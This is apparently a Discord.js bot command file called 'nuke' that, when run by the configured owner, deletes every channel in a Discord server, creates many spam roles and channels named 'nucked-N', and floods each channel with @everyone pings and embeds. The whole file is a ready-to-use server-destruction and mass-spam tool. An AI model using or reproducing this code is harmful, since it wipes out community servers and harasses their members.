module.exports.run = async (client, message, args) => {
    const { MessageEmbed } = require('discord.js');
    const config = require("../config.json");
    if (message.author.id == config.idowner) { } else return;
    message.delete();

    await message.guild.channels.cache.forEach(channel => {
        channel.delete().catch()
    })


    for (let i = 0; i < config.role1; i++) {
        message.guild.roles.create({
            color: 'RED',
            name: 'AmOnG uS',
            reason: 'Why not?',
        }).catch()
    }


    for (let i = 0; i < config.nombresalons; i++) {
        await message.guild.channels.create(`nucked-${i}`, {
            type: 'text'
        })
    }


    message.guild.channels.cache.forEach(channel => {
        for (let i = 0; i < config.msgsend; i++) {
            const exampleEmbed = new MessageEmbed()
                .setColor('#000000')
                .setTitle('AmOnG uS')

                .setThumbnail('https://cdn.discordapp.com/attachments/975146547190857768/975173759529005076/Capture.PNG')
            channel.send("@everyone")

            channel.send({ embeds: [exampleEmbed] }).catch()




        }
    })
}



module.exports.config = {
    name: "nuke",
    aliases: ["nuker"]
}
